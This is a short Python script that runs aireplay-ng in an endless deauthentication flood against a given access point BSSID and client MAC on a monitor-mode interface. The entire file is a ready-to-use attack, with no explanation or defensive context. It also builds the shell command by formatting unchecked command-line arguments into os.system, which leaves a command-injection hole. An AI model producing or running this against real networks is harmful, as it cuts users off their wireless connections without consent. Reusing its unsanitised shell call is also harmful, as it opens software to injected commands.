import sys, os
#bssid mac
bssid=sys.argv[1]

mac=sys.argv[2]

os.system("aireplay-ng --deauth 0 -a {} -c {} --ignore-negative-one mon0 ".format(bssid, mac))
